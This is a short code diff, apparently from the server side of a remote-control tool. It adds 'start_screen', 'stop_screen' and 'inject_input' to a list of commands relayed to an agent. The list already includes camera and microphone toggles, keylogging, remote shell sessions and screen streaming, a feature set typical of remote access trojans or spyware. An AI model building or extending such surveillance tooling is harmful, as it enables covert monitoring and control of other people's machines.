@@ -539,7 +539,8 @@ for _cmd in ("camera_on", "camera_off", "mic_on", "mic_off",
              "keylog_on", "keylog_off",
              "shell_start", "shell_input", "shell_stop",
              "pause_screen", "resume_screen",
-             "start_screen_stream", "stop_screen_stream"):
+             "start_screen_stream", "stop_screen_stream",
+             "start_screen", "stop_screen", "inject_input"):
     def _make_cmd_handler(ev):
         def _h(data):
             _to_agent(data, ev)
